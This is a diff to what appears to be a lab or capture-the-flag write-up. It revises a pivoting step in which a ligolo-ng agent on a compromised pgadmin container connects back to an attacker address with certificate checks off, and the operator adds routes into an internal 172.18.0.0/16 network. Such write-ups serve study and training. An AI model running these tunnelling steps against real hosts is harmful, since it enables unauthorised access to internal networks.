@@ -500,16 +500,11 @@ cb46692a4590:/tmp$ ./agent -connect 10.10.14.61:11601 --ignore-cert
 Then on the target ill trigger the connection back to me
 
 ```python
-[Agent : pgadmin@cb46692a4590] » autoroute
-? Select routes to add: 172.18.0.4/16
-? Create a new interface or use an existing one? Create a new interface
-? Enter interface name (leave empty for random name): ligolo
-INFO[0106] Using custom interface name: ligolo          
-INFO[0106] Interface ligolo configured (will be created on tunnel start) 
-INFO[0106] Creating routes for ligolo...                
-? Start the tunnel? Yes
-INFO[0110] Starting tunnel to pgadmin@cb46692a4590 (be2c24c30247) 
-[Agent : pgadmin@cb46692a4590] »
+[Agent : pgadmin@cb46692a4590] » ifcreate --name ligolo
+INFO[0588] Creating a new ligolo interface...
+
+[Agent : pgadmin@cb46692a4590] » route_add --name ligolo --route 172.18.0.0/16
+INFO[0612] Route created.
 ```
 
 Then on the proxy ill select the session using the `session` command then use the autoroute command to allow me to access the internal network then finally starting the tunnel
